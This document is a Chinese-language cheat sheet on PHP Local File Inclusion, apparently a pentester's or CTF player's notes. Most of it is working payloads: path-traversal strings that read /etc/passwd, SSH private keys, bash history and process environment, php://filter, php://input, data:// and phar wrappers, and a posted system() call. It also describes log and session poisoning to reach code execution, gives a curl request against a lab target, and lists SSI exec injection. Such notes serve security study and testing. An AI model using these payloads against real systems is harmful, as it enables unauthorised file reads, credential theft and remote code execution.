# FLI (Local File Inclusion)
[TOC]
###### tags: `Security` `Web`

# 常見場景
## PHP
+ `include()`
+ `requir()`
+ `include_once()`
+ `require_once()`

# Target
## Config
```
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/apache2/sites-available/000-default.conf
/etc/php/php.ini
```

## /proc/*
```
/proc/self/cmdline  // 執⾏時的 Command
/proc/self/exe      // 撈執⾏檔 (可以串 reverse/pwn)
/proc/self/environ  // 環境變數
/proc/self/fd/*     // filedescriptor
```

## 環境變數
- `../../../../proc/self/environ`
    - HTTP_User_Agent 塞 php script

## log file
可配合 RCE Tricks
```
access.log
error.log
```
- apache log
- mysql log
- mail log
- ssh log
    - `/var/log/auth.log`

## RCE Tricks
把 code 傳到目標上後，再進行 LFI
### Session 可控
各個版本的 php ， session 存放位置不同 [stackoverflow](https://stackoverflow.com/questions/4927850/location-for-session-files-in-apache-php)
- 常見存放路徑
```
/var/lib/php/sessions/sess_[session id]
/var/lib/php/session/sess_[session id]
/var/lib/php/
/var/lib/php5/
/var/tmp/
/tmp/
```
    
- `session.upload_progress`
    - PHP預設開啟
    - 用來監控上傳檔案進度
    - 當 `session.upload_progress.enabled` 開啟，可以 POST 在 `$_SESSION` 中添加資料
    - `session.upload_progress.cleanup=on`時，可以透過 Race condition

### 存在 phpinfo
可以在 phpinfo 看到上傳暫存檔的位置，對 server 以 form-data 硬傳檔案，會產生 tmp 檔 & Race condition => LFI Get shell

- Ubuntu 17後，預設開啟`PrivateTmp`，無法利用

### log file 可讀
寫在 `User-Agent / URL`


# Payloads
[GitHub: swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

```
curl http://kioptrix3.com/index.php\?system\=../../../../../etc/passwd%00W
```

## Linux / Unix

- `./index.php`
- `././index.php`
- `.//index.php`
- `../../../../../../etc/passwd`
- `../../../../../../etc/passwd%00`
    - 僅在5.3.0以下可用
    - magic_quotes_gpc需為OFF
- `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`
- `ＮＮ/ＮＮ/ＮＮ/etc/passwd`
- `/var/log/apache2/error.log`
- `/var/log/httpd/access_log`
- `/var/log/mail.log`
- `/usr/local/apache2/conf/httpd.conf`
- `/etc/apache2/apache2.conf`
- `/etc/apache2/httpd.conf`
- `/etc/apache2/sites-available/000-default.conf`
- `/usr/local/etc/apache2/httpd.conf`
- `/etc/nginx/conf.d/default.conf`
- `/etc/nginx/nginx.conf`
- `/etc/nginx/sites-enabled/default`
- `/etc/nginx/sites-enabled/default.conf`
- `/proc/net/fib_trie`
- `.htaccess`
- `/root/.bash_history`
- `/root/.ssh/id_rsa`
- `/root/.ssh/authorized_keys`

## Windows

- `C:/Windows/win.ini`
- `C:/boot.ini`
- `C:/apache/logs/access.log`
- `../../../../../../../../../boot.ini/.......................`
- `C:/windows/system32/drivers/etc/hosts`

## php://filter

- `php://filter/convert.base64-encode/resource=index.php`
- `php://filter/convert.base64-decode/resource=index.php`
- `php://filter/read=string.rot13/resource=index.php`
- `php://filter/zlib.deflate/resource=index.php`
- `php://filter/zlib.inflate/resource=index.php`
- `php://filter/convert.quoted-printable-encode/resource=index.php`
- `php://filter/read=string.strip_tags/resource=php://input`
- `php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=index.php`
- `php://filter/convert.iconv.UCS-4LE.UCS-4BE/resource=index.php`

## php://input

- `?page=php://input`
    - post data: `<?php system("net user"); ?>`
    - 需要有開啟`url_allow_include`，5.4.0直接廢除

## data://

- 條件
    - allow_url_fopen: On
    - allow_url_include: On
- 用法
    - `?file=data://text/plain,<?php phpinfo()?>`
    - `?file=data:text/plain,<?php phpinfo()?>`
    - `?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=`

## zip / phar

- 適用驗證副檔名時
- zip
    - 新建zip，裡頭壓縮php腳本(可改副檔名)
    - `?file=zip://myzip.zip#php.jpg`
- phar
    - ```php
        <?php
            $p = new PharData(dirname(__FILE__).'/phartest.zip',0,'phartest2',Phar::ZIP);
            $x = file_get_contents('./a.php');
            $p->addFromString('b.jpg', $x);
        ?>
    - 構造 `?file=phar://phartest.zip/b.jpg`

# Others
## SSI (Server Side Includes)

- 通常放在`.shtml`, `.shtm`
- Execute Command
    - `<!--#exec cmd="command"-->`
- File Include
    - `<!--#include file="../../web.config"-->`
- Example
    - HITCON CTF 2018 - Why so Serials?